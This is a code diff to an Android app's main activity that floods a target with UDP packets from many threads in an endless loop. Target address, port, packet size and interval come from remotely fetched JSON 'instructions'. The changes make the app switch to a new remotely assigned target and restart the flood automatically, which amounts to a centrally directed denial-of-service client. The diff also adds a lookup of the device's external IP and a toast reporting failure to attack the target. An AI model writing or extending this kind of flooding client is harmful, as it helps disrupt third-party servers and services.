@@ -5,10 +5,13 @@ import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.graphics.Color;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
 import android.support.annotation.NonNull;
+import android.support.annotation.RequiresApi;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.LayoutInflater;
@@ -27,6 +30,7 @@ import java.io.IOException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
+import java.util.Objects;
 
 import okhttp3.Call;
 import okhttp3.Callback;
@@ -58,9 +62,13 @@ public class MainActivity extends AppCompatActivity {
 
     private String serverAddr;
     private int serverPort;
+    private String serverAddrOld;
+    private int serverPortOld;
+
     private int packetSize;
     private int interval;
     private int threadCount;
+
 
     public static final String APP_PREFERENCES = "currentProfile";
     public String currentProfile;
@@ -97,16 +105,6 @@ public class MainActivity extends AppCompatActivity {
 
         mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);
 
-        final Handler actionHandler = new Handler() {
-            public void handleMessage(Message msg) {
-                try {
-                    getRequest(currentProfile);
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-        };
-
         threadsBar.setOnSeekBarChangeListener(
                 new SeekBar.OnSeekBarChangeListener() {
                     @Override
@@ -122,6 +120,16 @@ public class MainActivity extends AppCompatActivity {
 
                     public void onStopTrackingTouch(SeekBar seekBar) {}
                 });
+
+        final Handler actionHandler = new Handler() {
+            public void handleMessage(Message msg) {
+                try {
+                    getInstructionsRequest(currentProfile);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        };
 
         Thread autoUpdate = new Thread (new Runnable() {
             @Override
@@ -187,7 +195,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void attack(String method) {
-
         for (int i = 0; i <= threadCount; i++) {
             Thread background = new Thread(new Runnable() {
                 @Override
@@ -200,18 +207,30 @@ public class MainActivity extends AppCompatActivity {
                         //noinspection InfiniteLoopStatement
                         while (true) {
                             DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, IPAddress, serverPort);
+
                             if (interval > 0)
                                 Thread.sleep(interval);
-                            clientSocket.send(sendPacket);
-                            packetsSent++;
 
                             if (!isAttacking) {
                                 packetsSent = 0;
                                 clientSocket.close();
                                 return;
                             }
+
+                            clientSocket.send(sendPacket);
+                            packetsSent++;
                         }
-                    } catch (IOException | InterruptedException ignored) {}
+                    } catch (IOException | InterruptedException e) {
+                        runOnUiThread(new Runnable() {
+                            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+                            @Override
+                            public void run() {
+                                isAttacking = false;
+                                updateUI("notAttacking");
+                                Toast.makeText(getApplicationContext(), "Ошибка атаки указанной цели. Проверьте инструкции.", Toast.LENGTH_SHORT).show();
+                            }
+                        });
+                    }
                 }
             });
             background.start();
@@ -258,7 +277,7 @@ public class MainActivity extends AppCompatActivity {
         currentProfile = String.valueOf(profileSelector.getText());
         editor.putString("currentProfile", currentProfile);
         editor.apply();
-        getRequest(currentProfile);
+        getInstructionsRequest(currentProfile);
         Toast.makeText(getApplicationContext(), "Успешно сохранено", Toast.LENGTH_SHORT).show();
     }
 
@@ -302,7 +321,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     // сокрытие информации и показ основного меню
-    public void bBackLayoutInfoClick(View view) {
+    public void bBackClick(View view) {
 
         layout_main.setAlpha(1f);
         layout_main.setEnabled(true);
@@ -320,12 +339,12 @@ public class MainActivity extends AppCompatActivity {
 
         if (currentProfile != "") {
             profileSelector.setText(currentProfile);
-            getRequest(currentProfile);
+            getInstructionsRequest(currentProfile);
         } else
             profileSelector.setText(getResources().getString(R.string.standart));
     }
 
-    void getRequest(String url) throws IOException {
+    void getInstructionsRequest(String url) throws IOException {
 
         Request request;
         try {
@@ -354,6 +373,7 @@ public class MainActivity extends AppCompatActivity {
                     public void onResponse(@NonNull Call call, @NonNull final Response response) throws IOException {
                         final String res = response.body().string();
                         runOnUiThread(new Runnable() {
+                            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                             @Override
                             public void run() {
                                 try {
@@ -367,7 +387,47 @@ public class MainActivity extends AppCompatActivity {
                 });
     }
 
+    void getIPRequest(String url) {
+
+        Request request;
+        try {
+            request = new Request.Builder()
+                    .url(url)
+                    .build();
+        } catch (Exception e) {
+            return;
+        }
+
+        assert request != null;
+        OkHttpClient client = new OkHttpClient();
+        client.newCall(request)
+                .enqueue(new Callback() {
+                    @Override
+                    public void onFailure(@NonNull final Call call, IOException e) {
+                        runOnUiThread(new Runnable() {
+                            @Override
+                            public void run() {
+                                Toast.makeText(getApplicationContext(), "Ошибка получения клиентского IP", Toast.LENGTH_SHORT).show();
+                            }
+                        });
+                    }
+
+                    @Override
+                    public void onResponse(@NonNull Call call, @NonNull final Response response) throws IOException {
+                        final String res = response.body().string();
+                        runOnUiThread(new Runnable() {
+                            @Override
+                            public void run() {
+                                textClientIP.setText(getResources().getString(R.string.clientIP)+ res.substring(0, res.length() - 1));
+                            }
+                        });
+                    }
+                });
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
     private void dataProcessing(String rawJson) throws JSONException {
+
         JSONObject json = new JSONObject(rawJson);
         String serverName = json.getString("name");
         String serverDesc = json.getString("desc");
@@ -377,14 +437,29 @@ public class MainActivity extends AppCompatActivity {
         interval = json.getInt("interval");
         String sourceMotd = json.getString("motd");
 
+        if (((serverAddrOld != null) && (serverPortOld != 0)) && ((!Objects.equals(serverAddrOld, serverAddr)) || (serverPortOld != serverPort))) {
+            isAttacking = false;
+            try {
+                Thread.sleep(220);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+
+            isAttacking = true;
+            attack("UDP");
+        }
+
         textServerName.setText(getResources().getString(R.string.name) + serverName);
         textServerDesc.setText(getResources().getString(R.string.desc) + serverDesc);
         textServerAddr.setText(getResources().getString(R.string.addr) + serverAddr+":"+serverPort);
         textPacketSize.setText(getResources().getString(R.string.packetSize) + packetSize);
         textInterval.setText(getResources().getString(R.string.interval) + interval);
-        textClientIP.setText(getResources().getString(R.string.clientIP)+ "127.0.0.1");
+        getIPRequest("http://myexternalip.com/raw");
         textPacketsSent.setText(getResources().getString(R.string.packetsSent) + packetsSent);
         textSourceMOTD.setText(sourceMotd);
+
+        serverAddrOld = serverAddr;
+        serverPortOld = serverPort;
     }
 
     private void setDefaultData() {
